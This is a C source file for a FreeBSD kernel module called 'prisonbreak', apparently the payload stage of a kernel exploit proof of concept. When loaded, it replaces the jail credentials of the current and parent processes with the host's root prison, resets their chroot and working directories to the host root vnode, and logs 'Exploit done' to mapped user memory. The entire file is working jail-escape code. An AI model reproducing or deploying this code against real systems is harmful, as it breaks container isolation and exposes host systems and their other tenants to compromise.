#include <sys/filedesc.h>
#include <sys/jail.h>
#include <sys/module.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/vnode.h>
#include <vm/uma.h>
#include <sys/buf.h>
#include <sys/bio.h>
#include <sys/_stdarg.h>

#define USER_MAPPED_MEMORY_ADDRESS 0x0000414141410000ULL
#define USER_MAPPED_MEMORY_LEN 4096
#define USER_MAPPED_MEMORY_PAGES 4

extern struct mtx Giant;
extern struct prison prison0;

struct print_msg {
  unsigned int entry_ready;
  unsigned int len;
  char msg[0];
};

void poc_unjail_current_process(void);
void poc_unjail_parent_process(void);
void poc_escape_chroot_current_process(void);
void poc_escape_chroot_parent_process(void);
struct buf* map_user_memory(void);
void user_log(char* fmt, ...);
void report_exploit_done(void);

char* user_memory = NULL;

void poc_unjail_current_process(void) {
  struct thread* td = curthread;
  struct proc* p = td->td_proc;
  struct ucred *oldcr, *newcr;

  PROC_LOCK(p);

  oldcr = td->td_ucred;
  /* duplicate creds (also copies refcounts for groups, etc.) */
  newcr = crdup(oldcr);

  /* bump refcount on prison0 for safety */
  prison_hold(&prison0);
  newcr->cr_prison = &prison0;

  /* point both thread + proc to new creds */
  td->td_ucred = newcr;
  p->p_ucred = newcr;

  PROC_UNLOCK(p);
  crfree(oldcr);
}

void poc_unjail_parent_process(void) {
  struct thread* td = curthread;
  struct proc* p = td->td_proc;
  struct proc* pp;
  struct ucred *oldcr, *newcr;

  PROC_LOCK(p);
  pp = p->p_pptr;
  if (pp == NULL) {
    PROC_UNLOCK(p);
    return;
  }
  PROC_LOCK(pp);
  PROC_UNLOCK(p);

  oldcr = pp->p_ucred;
  /* duplicate creds (also copies refcounts for groups, etc.) */
  newcr = crdup(oldcr);

  /* bump refcount on prison0 for safety */
  prison_hold(&prison0);
  newcr->cr_prison = &prison0;

  /* point proc to new creds */
  pp->p_ucred = newcr;

  /* set each thread's cred (for stuff that looks at td_ucred) */
  struct thread* td2;
  FOREACH_THREAD_IN_PROC(pp, td2) { td2->td_ucred = newcr; }

  PROC_UNLOCK(pp);
  crfree(oldcr);
}

void poc_escape_chroot_current_process(void) {
  struct thread* td = curthread;
  struct proc* p = td->td_proc;
  struct pwddesc* process_pwd_desc;

  process_pwd_desc = p->p_pd;
  PWDDESC_XLOCK(process_pwd_desc);

  // NOTE(m): pd_pwd member is an SMR pointer (smrpwd_t) to a struct pwd * and
  // we cannot use it without going though that entire API. So we use some bad
  // code instead to bypass all that and get a pointer to pwd, which we then use
  // to set the directory vnodes to the rootvnode instead.
  struct pwd* pwdptr = *(struct pwd**)&process_pwd_desc->pd_pwd;
  pwdptr->pwd_cdir = rootvnode;
  pwdptr->pwd_rdir = rootvnode;
  pwdptr->pwd_jdir = rootvnode;

  PWDDESC_XUNLOCK(process_pwd_desc);
}

void poc_escape_chroot_parent_process(void) {
  struct thread* td = curthread;
  struct proc* p = td->td_proc;
  struct proc* pp;
  struct pwddesc* process_pwd_desc;

  pp = p->p_pptr;
  process_pwd_desc = pp->p_pd;
  PWDDESC_XLOCK(process_pwd_desc);

  // NOTE(m): pd_pwd member is an SMR pointer (smrpwd_t) to a struct pwd * and
  // we cannot use it without going though that entire API. So we use some bad
  // code instead to bypass all that and get a pointer to pwd, which we then use
  // to set the directory vnodes to the rootvnode instead.
  struct pwd* pwdptr = *(struct pwd**)&process_pwd_desc->pd_pwd;
  pwdptr->pwd_cdir = rootvnode;
  pwdptr->pwd_rdir = rootvnode;
  pwdptr->pwd_jdir = rootvnode;

  PWDDESC_XUNLOCK(process_pwd_desc);
}

struct buf* map_user_memory(void) {
  struct buf* buf = NULL;
  void* fixed = (void*)(uintptr_t)USER_MAPPED_MEMORY_ADDRESS;

  buf = uma_zalloc(pbuf_zone, M_WAITOK);
  buf->b_iocmd = BIO_READ;
  if (vmapbuf(buf, fixed, USER_MAPPED_MEMORY_LEN * USER_MAPPED_MEMORY_PAGES, 1) < 0) {
    printf("map_user_memory(): Failed...\n");
    uma_zfree(pbuf_zone, buf);
    return NULL;
  }

  return buf;
}

void user_log(char* fmt, ...) {
  __va_list args;
  struct print_msg* msg;
  msg = (struct print_msg*)user_memory;

  while (msg->entry_ready != 0) {
    msg = (struct print_msg*)(((char*)msg) + msg->len + sizeof(struct print_msg));
  }
  va_start(args, fmt);
  int count = vsprintf(msg->msg, fmt, args);
  va_end(args);
  msg->len = count;
  msg->entry_ready = 1;
}

void report_exploit_done(void) {
  user_log("Exploit done\n");
  struct print_msg* msg;
  msg = (struct print_msg*)user_memory;

  while (msg->entry_ready != 0) {
    msg = (struct print_msg*)(((char*)msg) + msg->len + sizeof(struct print_msg));
  }
  msg->entry_ready = 2;
}

/*
 * Event handler for the module.
 */
static int prisonbreak_modevent(module_t mod __unused, int event, void* arg __unused) {
  struct buf* buf;

  switch (event) {
    case MOD_LOAD:
      if ((buf = map_user_memory()) == NULL) {
        printf("WARNING: Failed to map user memory for communication!\n");
      } else {
        user_memory = buf->b_data;
        user_log("User memory mapped: %x\n", *user_memory);
      }

      user_log("Prisonbreak kernel module loaded\n");

      // Escape jail
      user_log("Escaping current process from jail\n");
      poc_unjail_current_process();
      user_log("Escaping parent process from jail\n");
      poc_unjail_parent_process();

      // Escape jail chroot
      user_log("Changing current process chroot to host\n");
      poc_escape_chroot_current_process();
      user_log("Changing parent process chroot to host\n");
      poc_escape_chroot_parent_process();

      // Cleanup from exploit
      user_log("Cleaning up from exploit\n");
      report_exploit_done();

      if (buf != NULL) {
        vunmapbuf(buf);
        uma_zfree(pbuf_zone, buf);
      }

      // NOTE: We have to do this twice for some reason
      mtx_unlock(&Giant);
      mtx_unlock(&Giant);

      struct thread* td = curthread;
      struct proc* p = td->td_proc;
      PROC_LOCK(p);

      thread_exit();

      break;
    default:
      return (EOPNOTSUPP);
  }

  return (0);
}

static moduledata_t prisonbreak_mod = {
    "prisonbreak",        /* module name */
    prisonbreak_modevent, /* event handler */
    NULL                  /* extra data */
};

DECLARE_MODULE(prisonbreak, prisonbreak_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
MODULE_VERSION(prisonbreak, 1);
